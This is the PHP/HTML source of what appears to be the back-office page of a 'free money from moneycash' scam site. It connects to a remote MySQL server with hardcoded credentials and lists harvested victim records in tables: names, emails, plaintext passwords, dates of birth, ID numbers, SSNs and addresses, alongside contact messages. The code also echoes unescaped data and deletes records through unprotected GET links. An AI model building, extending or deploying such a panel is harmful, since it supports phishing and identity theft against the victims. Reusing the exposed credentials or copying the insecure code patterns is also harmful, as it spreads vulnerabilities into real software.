
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:url" content="">
<meta property="og:type" content="article">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="claim your free money from moneycash">
<meta property="og:description" content="click here to claim it">
<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0ALf79_X_jnkTfeyU_tB7CI_WWtzZqjj-KA&usqp=CAU">
<body>

   

<div class="scroll"><marquee >Money Cash RecordS And Information Display</marquee></div>
<h6>---------------------------------------------------------------------------------</h6>

<button  name="logout" value="LOGIN INFORMATION"  class="btn btn-primary btn-lg btn-block">LOGIN INFORMATION</button>
<div class="table-responsive">
<table class='table table-bordered'>
<thead class="thead-dark">
       <tr>

         <th scope='col'>#</th>
         <th scope='col'>FirstName</th>
         <th scope='col'>(OPTIONAL)MiddleName</th>
         <th scope='col'>LastLName</th>
         <th scope='col'>Email address</th>
         <th scope="col">Pssword</th>
         <th scope='col'>Date of Birth</th>
         <th scope='col'>Zip Code</th>
         <th scope='col'>ID Type</th>
         <th scope='col'>ID Number</th>
         <th scope='col'>SNN</th>
         <th scope='col'>Address</th>
         <th scope='col'>City</th>
         <th scope='col'>Country</th>
         <th scope='col'>Delete</th>
         
       </tr>
       </thead>
<?php
$username = "adeniran1234";
$password = "JOShua123@#";
$database = "users";
$host="mysql-23766-0.cloudclusters.net:23808";
$conn = new mysqli($host, $username, $password, $database);
$query = "SELECT *FROM users";
if ($result= $conn->query($query)){ 
    while ($row= $result->fetch_assoc()){
       $email = $row['email'];
       $firstname=$row['user'];
       $id=$row['uid'];
       $lastname=$row['lastname'];
       $middle=$row['middle_name'];
       $country=$row['country'];
       $date=$row['date_of_birth'];
       $address=$row['adress'];
       $city=$row['city'];
       $zip_code=$row['zip_code'];
       $id_type=$row['id_type'];
       $id_number=$row['id_number'];
       $ssn=$row['ssn'];
       $password=$row['pass'];
       echo "
       <tbody>
  <tr>
    <th scope='row'>$id</th>
    
    <td>$firstname</td>
    <td>$middle</td>
    <td>$lastname</td>
    <td>$email</td>
    <td>$password</td>
    <td>$date</td>
    <td>$zip_code</td>
    <td>$id_type</td>
    <td>$id_number</td>
    <td>$ssn</td>
    <td>$address</td>
    <td>$city</td>
    <td>$country</td>
    
    <td><a  class='btn' role='button' href='delete.php?id=$id'><i class='fa fa-trash'></i>   Delete</a></button></td>
    
  </tr>
  
</tbody>

       
              ";
      
    }
}
?>
</table>
</div>
<h6>,...............................................................</h6>
  
<button  name="logout" value="MESSAGE INFORMATION"  class="btn btn-primary btn-lg btn-block">MESSAGE INFORMATION</button>
<div class="table-responsive">
<table class='table table-bordered'>
<thead class="thead-dark">
       <tr>

         <th scope='col'>#</th>
         <th scope='col'>Full Name</th>
         <th scope='col'>Email Address</th>
         <th scope='col'>Subject.</th>
         <th scope='col'>Messages</th>
         <th scope='col'>Delete</th> 
       </tr>    
<?php
$con=$query = "SELECT *FROM  contact";
if ($res= $conn->query($con)){ 
    while ($line= $res->fetch_assoc()){
        $id=$line['id'];
        $email1=$line['email'];
        $fulname=$line['fulname'];
        $message=$line['messages'];
        $body=$line['body'];

        echo "
        <tbody>
   <tr>
     <th scope='row'>$id</th>
     
     <td>$fulname</td>
     <td>$email1</td>
     <td>$body</td>
     <td>$message</td>
     <td><a  class='btn' role='button' href='del.php?id=$id'><i class='fa fa-trash'></i>   Delete</a></button></td>
     
     
     </tr>
  
</tbody>";

    }
}
?>     

</table>
</div>
<h6>,...............................................................</h6>

<style>
body{
    
    background: whitesmoke;
    max-width: 100000%;
    background-repeat: no-repeat;
   
   
}
.scroll{
    color: blue;
    font-weight: 900;
    font-style: italic;
    font-variant-ligatures: additional-ligatures;
    font-family: Arial, Helvetica, sans-serif;
    background: greenyellow;
    font-size: 30px;
    
}
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 16px;
  font-size: 16px;
  cursor: pointer;
}

/* Darker background on mouse-over */
.btn:hover {
  background-color: RoyalBlue;
}
h6{
    background-image: linear-gradient( red , yellow,green,brown,cyan,purple,white,black,green,whitesmoke);
    
}
</style>



</body>
